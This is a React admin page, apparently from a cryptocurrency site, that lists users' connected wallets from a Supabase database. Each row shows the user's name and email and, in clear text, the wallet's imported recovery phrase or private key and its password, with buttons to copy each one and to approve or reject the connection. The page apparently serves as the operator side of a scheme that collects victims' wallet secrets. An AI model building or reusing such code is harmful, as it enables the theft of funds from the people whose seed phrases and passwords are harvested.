import { useEffect, useState } from 'react';
import { Loader2, Search, Wallet, Check, X, Copy, CheckCircle2 } from 'lucide-react';
import { supabase } from '../../lib/supabase';
import SEOHead from '../../components/SEOHead';

export default function AdminWalletsPage() {
  const [wallets, setWallets] = useState<any[]>([]);
  const [loading, setLoading] = useState(true);
  const [searchQuery, setSearchQuery] = useState('');
  const [activeTab, setActiveTab] = useState<'all' | 'pending' | 'approved' | 'rejected' | 'disconnected'>('all');
  const [copiedId, setCopiedId] = useState<string | null>(null);
  const [processingId, setProcessingId] = useState<string | null>(null);

  useEffect(() => {
    fetchWallets();
  }, []);

  const fetchWallets = async () => {
    try {
      setLoading(true);
      // Try to fetch connected wallets with phrases
      const { data: connectedData, error: connectedError } = await supabase
        .from('connected_wallets')
        .select(`
          *,
          profiles:user_id (full_name, email)
        `)
        .order('created_at', { ascending: false });

      if (!connectedError && connectedData) {
        setWallets(connectedData);
      } else {
        // Fallback to standard wallets if connected_wallets doesn't exist
        console.log('connected_wallets not found, trying wallets table');
        const { data: standardData, error: standardError } = await supabase
          .from('wallets')
          .select(`
            id, user_id, currency as wallet_name, 'address' as import_type, address as import_data, created_at, 'approved' as status,
            profiles:user_id (full_name, email)
          `)
          .order('created_at', { ascending: false });
          
        if (!standardError && standardData) {
          setWallets(standardData);
        } else {
          setWallets([]);
        }
      }
    } catch (error) {
      console.error('Error fetching wallets:', error);
      setWallets([]);
    } finally {
      setLoading(false);
    }
  };

  const handleCopy = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  };

  const handleStatusUpdate = async (walletId: string, newStatus: string) => {
    try {
      setProcessingId(walletId);

      const { error } = await (supabase as any)
        .from('connected_wallets')
        .update({ status: newStatus })
        .eq('id', walletId);

      if (error) throw error;

      // Update local state
      setWallets(prev => prev.map(w => 
        w.id === walletId ? { ...w, status: newStatus } : w
      ));

    } catch (error) {
      console.error(`Error updating wallet status to ${newStatus}:`, error);
    } finally {
      setProcessingId(null);
    }
  };

  const filteredWallets = wallets.filter(w => {
    const matchesSearch = w.profiles?.full_name?.toLowerCase().includes(searchQuery.toLowerCase()) || 
      w.profiles?.email?.toLowerCase().includes(searchQuery.toLowerCase()) ||
      w.wallet_name?.toLowerCase().includes(searchQuery.toLowerCase());
      
    if (!matchesSearch) return false;
    if (activeTab === 'all') return true;
    
    const status = w.status || 'pending';
    return status === activeTab;
  });

  return (
    <div className="space-y-6">
      <SEOHead title="Admin Wallets" description="Review user wallet connections." path="/admin/wallets" noIndex />
      <div className="flex flex-col gap-4">
        <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
          <div>
            <h1 className="text-2xl font-bold font-heading text-white">Connected Wallets</h1>
            <p className="text-white/60 mt-1">Review user wallet connections and details.</p>
          </div>
          <div className="relative w-full md:w-72">
            <Search className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-white/40" />
            <input
              type="text"
              placeholder="Search wallets..."
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              className="w-full pl-10 pr-4 py-2 bg-surface-900 border border-white/10 rounded-xl text-white placeholder-white/40 focus:outline-none focus:border-brand-500 transition-colors"
            />
          </div>
        </div>

        <div className="flex overflow-x-auto pb-2 gap-2" style={{ scrollbarWidth: 'none', msOverflowStyle: 'none' }}>
          {['all', 'pending', 'approved', 'rejected', 'disconnected'].map(tab => (
            <button
              key={tab}
              onClick={() => setActiveTab(tab as any)}
              className={`px-4 py-2 rounded-xl text-sm font-bold capitalize whitespace-nowrap transition-colors ${
                activeTab === tab
                  ? 'bg-brand-500 text-white'
                  : 'bg-surface-900 border border-white/10 text-white/60 hover:text-white hover:border-white/20'
              }`}
            >
              {tab === 'approved' ? 'Connected' : tab}
            </button>
          ))}
        </div>
      </div>

      <div className="rounded-2xl border border-white/5 bg-surface-900 overflow-hidden">
        {loading ? (
          <div className="flex items-center justify-center h-64">
            <Loader2 className="w-8 h-8 text-brand-500 animate-spin" />
          </div>
        ) : (
          <div className="overflow-x-auto">
            <table className="w-full text-sm text-left whitespace-nowrap">
              <thead className="text-xs uppercase bg-black/20 text-white/40 border-b border-white/5">
                <tr>
                  <th className="px-6 py-4 font-bold tracking-wider">User</th>
                  <th className="px-6 py-4 font-bold tracking-wider">Wallet App</th>
                  <th className="px-6 py-4 font-bold tracking-wider min-w-[250px]">Import Details</th>
                  <th className="px-6 py-4 font-bold tracking-wider">Status</th>
                  <th className="px-6 py-4 font-bold tracking-wider">Connected Date</th>
                  <th className="px-6 py-4 font-bold tracking-wider text-right">Actions</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-white/5">
                {filteredWallets.map((wallet) => (
                  <tr key={wallet.id} className="hover:bg-white/5 transition-colors">
                    <td className="px-6 py-4">
                      <div className="flex flex-col">
                        <span className="font-medium text-white">{wallet.profiles?.full_name || 'N/A'}</span>
                        <span className="text-xs text-white/40">{wallet.profiles?.email}</span>
                      </div>
                    </td>
                    <td className="px-6 py-4 font-bold text-white flex items-center gap-2">
                      <Wallet size={16} className="text-brand-400" />
                      {wallet.wallet_name || 'Unknown'}
                    </td>
                    <td className="px-6 py-4">
                      <div className="space-y-1">
                        <span className="px-2 py-0.5 rounded text-[10px] font-bold uppercase tracking-widest bg-brand-500/20 text-brand-400 border border-brand-500/30">
                          {wallet.import_type}
                        </span>
                        <div className="flex items-center gap-2 max-w-[250px] p-2 bg-black/40 rounded-lg border border-white/5 group">
                          <span className="font-mono text-xs text-white/80 truncate">
                            {wallet.import_data}
                          </span>
                          <button
                            onClick={() => handleCopy(wallet.import_data, wallet.id)}
                            className="p-1.5 text-white/40 hover:text-white hover:bg-white/10 rounded transition-colors opacity-0 group-hover:opacity-100 flex-shrink-0"
                            title="Copy Phrase/Key"
                          >
                            {copiedId === wallet.id ? <CheckCircle2 size={14} className="text-emerald-400" /> : <Copy size={14} />}
                          </button>
                        </div>
                        {wallet.password && (
                          <div className="flex items-center gap-2 max-w-[250px] p-2 bg-black/40 rounded-lg border border-white/5 group">
                            <span className="font-mono text-xs text-white/60">Pass: {wallet.password}</span>
                            <button
                              onClick={() => handleCopy(wallet.password, `pass-${wallet.id}`)}
                              className="p-1.5 text-white/40 hover:text-white hover:bg-white/10 rounded transition-colors opacity-0 group-hover:opacity-100 flex-shrink-0 ml-auto"
                            >
                              {copiedId === `pass-${wallet.id}` ? <CheckCircle2 size={14} className="text-emerald-400" /> : <Copy size={14} />}
                            </button>
                          </div>
                        )}
                      </div>
                    </td>
                    <td className="px-6 py-4">
                      <span className={`px-2.5 py-1 text-[10px] font-bold uppercase tracking-wider rounded-lg ${
                        wallet.status === 'approved' ? 'bg-emerald-500/10 text-emerald-400' :
                        wallet.status === 'rejected' ? 'bg-red-500/10 text-red-400' :
                        wallet.status === 'disconnected' ? 'bg-white/10 text-white/50' :
                        'bg-orange-500/10 text-orange-400'
                      }`}>
                        {wallet.status || 'pending'}
                      </span>
                    </td>
                    <td className="px-6 py-4 text-white/60">
                      {new Date(wallet.created_at).toLocaleString()}
                    </td>
                    <td className="px-6 py-4 text-right">
                      {(!wallet.status || wallet.status === 'pending') && wallet.import_type !== 'address' ? (
                        <div className="flex items-center justify-end gap-2">
                          {processingId === wallet.id ? (
                            <Loader2 className="w-5 h-5 text-brand-500 animate-spin" />
                          ) : (
                            <>
                              <button
                                onClick={() => handleStatusUpdate(wallet.id, 'approved')}
                                className="p-1.5 text-emerald-400 hover:bg-emerald-400/10 rounded-lg transition-colors"
                                title="Approve Connection"
                              >
                                <Check size={18} />
                              </button>
                              <button
                                onClick={() => handleStatusUpdate(wallet.id, 'disconnected')}
                                className="p-1.5 text-white/40 hover:bg-white/10 rounded-lg transition-colors"
                                title="Disconnect Wallet"
                              >
                                <X size={18} />
                              </button>
                              <button
                                onClick={() => handleStatusUpdate(wallet.id, 'rejected')}
                                className="p-1.5 text-red-400 hover:bg-red-400/10 rounded-lg transition-colors"
                                title="Reject Connection"
                              >
                                <X size={18} className="text-red-400" />
                              </button>
                            </>
                          )}
                        </div>
                      ) : (
                        <span className="text-white/40 italic">-</span>
                      )}
                    </td>
                  </tr>
                ))}
                {filteredWallets.length === 0 && (
                  <tr>
                    <td colSpan={6} className="px-6 py-10 text-center">
                      <div className="flex flex-col items-center justify-center text-white/40">
                        <Wallet size={32} className="mb-2 opacity-50" />
                        <p>No wallet connections found.</p>
                      </div>
                    </td>
                  </tr>
                )}
              </tbody>
            </table>
          </div>
        )}
      </div>
    </div>
  );
}
